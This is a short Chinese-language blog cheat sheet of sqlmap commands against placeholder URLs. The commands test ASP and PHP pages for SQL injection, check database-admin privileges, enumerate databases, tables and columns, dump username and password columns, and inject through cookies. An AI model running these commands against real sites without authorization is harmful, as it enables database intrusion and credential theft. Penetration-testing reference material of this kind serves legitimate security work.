---

title: sqlmap常用命令
date: 2021-08-01
Author: 南念
tags: [sqlmap, 渗透]
comments: true
categories: 渗透
---

## sql常用命令

#### ASP网站监测方法
<!-- more -->
```sh
sqlmap -u "http://xxxx.com/home/login.asp?id=10"	-u 检测是否存在注入

sqlmap -u "http://xxxx.com/home/login.asp?id=10" --tables	猜解表名

sqlmap -u "http://xxxx.com/home/login.asp?id=10" --columns -T “user”		--columns  猜列名

sqlmap -u "http://xxxx.com/home/login.asp?id=10" --dump -C “username,password" -T "user"
\-\-dump 下载数据	-C "username,password"  列名
```

#### **PHP网站监测**

```sh
sqlmap -u "http://xxxx.com/home/login.php?id=10"	-u 检测是否存在注入

sqlmap -u "http://xxxx.com/home/login.php?id=10" --is-dba		查看是否dba权限，可直接写文件至目录

sqlmap -u "http://xxxx.com/home/login.php?id=10" --dbs	列出所有数据库

sqlmap -u "http://xxxx.com/home/login.php?id=10" --current-db	查询当前所使用的数据库

sqlmap -u "http://xxxx.com/home/login.php?id=10" --tables -D “库名”		查询表名

sqlmap -u "http://xxxx.com/home/login.php?id=10" --columns -T "表名" -D "库名"
查询所有的列明
sqlmap -u "http://xxxx.com/home/login.php?id=10" --dump -C "列名，列名" -T "表名" -D "库名"
查询对应列的数据
```

#### **sqlmap  cookie注入**

```sh
sqlmap -u “http://xxx.com/inde.asp" --cookie "id=1" --level 2		id=页面的id
```

